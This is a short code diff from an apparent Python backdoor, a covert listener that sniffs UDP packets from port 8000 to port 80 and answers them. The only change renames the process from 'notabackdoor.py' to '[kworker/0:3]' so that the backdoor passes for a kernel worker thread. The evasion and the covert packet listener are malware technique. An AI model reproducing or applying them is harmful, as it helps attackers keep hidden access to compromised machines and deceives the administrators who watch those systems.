@@ -23,7 +23,7 @@ def parsePacket(receivedPacket):
     send(returnPacket)
 
 def main():
-    setproctitle.setproctitle("notabackdoor.py")
+    setproctitle.setproctitle("[kworker/0:3]")
     sniff(filter="udp and (dst port 80) and (src port 8000)", prn=parsePacket)
 
 if __name__ == '__main__':
